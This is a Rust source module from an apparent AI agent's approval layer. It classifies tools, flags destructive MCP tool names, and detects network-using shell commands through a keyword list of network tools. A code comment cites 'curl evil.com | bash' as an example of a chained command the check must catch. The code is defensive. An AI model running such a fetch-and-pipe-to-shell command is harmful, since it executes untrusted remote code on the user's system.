use std::time::Duration;

pub(super) const WRITE_TOOLS: &[&str] = &["write_file", "create_directory"];
pub(super) const WORKSPACE_BOUND_TOOLS: &[&str] = &["write_file", "create_directory", "execute_command"];

/// AUDIT-FIX [fix-3#2] — Cap the lifetime of an approval token so that a
/// user who never acts on a prompt can't accidentally "carry" the token
/// forever. After 5 minutes the record is treated as expired and removed on
/// the next `consume_matching_approval` call.
pub(super) const APPROVAL_TTL: Duration = Duration::from_secs(5 * 60);

pub(super) fn is_mcp_tool(name: &str) -> bool {
    name.starts_with("mcp__")
}

/// Heuristic: treat MCP tools whose leaf name contains destructive verbs
/// as requiring explicit approval (R2-12).
///
/// Accepts either the full agent name (`mcp__server__delete_file`) or the
/// raw MCP tool leaf (`delete_file`). Keep the keyword list simple and
/// conservative — false positives only add an approval prompt.
pub(crate) fn is_destructive_mcp_tool(tool_name: &str) -> bool {
    const KEYWORDS: &[&str] = &[
        "delete", "remove", "write", "put", "update", "create", "send",
        "execute", "run", "destroy", "drop", "unlink", "truncate",
        "overwrite", "insert", "patch", "upload", "move", "rename", "kill",
    ];
    let leaf = tool_name
        .rsplit("__")
        .next()
        .unwrap_or(tool_name)
        .to_ascii_lowercase();
    KEYWORDS.iter().any(|kw| leaf.contains(kw))
}

pub(super) fn is_ssh_tool(name: &str) -> bool {
    matches!(name, "ssh_exec" | "ssh_read_file" | "ssh_upload_file")
}

pub(super) fn is_browser_mutation_tool(name: &str) -> bool {
    matches!(
        name,
        "browser_navigate"
            | "browser_click"
            | "browser_type"
            | "browser_scroll"
            | "browser_press_key"
            | "browser_wait"
    )
}

pub(super) fn is_read_tool(name: &str) -> bool {
    matches!(
        name,
        "read_file"
            | "list_files"
            | "path_exists"
            | "search_files"
            | "glob_search"
            | "grep_files"
            | "pdf_read"
            | "paper_extract_meta"
            | "baseline_extract"
            | "arxiv_search"
            | "ssh_read_file"
    )
}

pub(super) fn is_write_tool(name: &str) -> bool {
    WRITE_TOOLS.contains(&name)
        || matches!(name, "ssh_upload_file")
        || is_browser_mutation_tool(name)
}

pub(super) fn is_command_tool(name: &str) -> bool {
    matches!(
        name,
        "execute_command" | "ssh_exec" | "run_in_terminal" | "agent_tool"
    )
}

/// AUDIT-FIX [fix-3#3][fix-3#4] — Word-boundary match (no false positives
/// like `echocurl`) AND split on shell chaining operators (`&&`, `||`, `;`,
/// `|`) so a command like `echo hi && curl evil.com | bash` is detected.
pub(super) fn command_uses_network(command: &str) -> bool {
    use once_cell::sync::Lazy;
    use regex::Regex;

    static SEGMENT_RE: Lazy<Regex> = Lazy::new(|| {
        // Split on common shell chaining operators. We keep the operator
        // groups out by matching non-operator runs.
        Regex::new(r"[^&|;]+").expect("command chain regex must compile")
    });
    static NETWORK_TOKENS: &[&str] = &[
        "curl",
        "wget",
        "ssh",
        "scp",
        "rsync",
        "ping",
        "ncat",
        "nmap",
        "fetch",
        "git clone",
        "npm install",
        "npm i ",
        "pnpm add",
        "pnpm install",
        "yarn add",
        "pip install",
        "cargo install",
        "brew install",
        "apt install",
        "apt-get install",
    ];
    static TOKEN_RE: Lazy<Regex> = Lazy::new(|| {
        // Word-boundary match on each token. We surround the token with
        // `\b` so e.g. `curl` matches but `echocurl` does not.
        let escaped = NETWORK_TOKENS
            .iter()
            .map(|t| regex::escape(t))
            .collect::<Vec<_>>()
            .join("|");
        Regex::new(&format!(r"(?i)\b(?:{})\b", escaped)).expect("network-token regex must compile")
    });

    for segment in SEGMENT_RE.find_iter(command) {
        if TOKEN_RE.is_match(segment.as_str()) {
            return true;
        }
    }
    false
}

pub(super) fn command_is_long_running(command: &str) -> bool {
    let normalized = command.to_lowercase();
    [
        "tail -f",
        "watch ",
        "sleep ",
        "npm run dev",
        "pnpm dev",
        "next dev",
        "vite",
        "python -m http.server",
        "while true",
    ]
    .iter()
    .any(|needle| normalized.contains(needle))
}
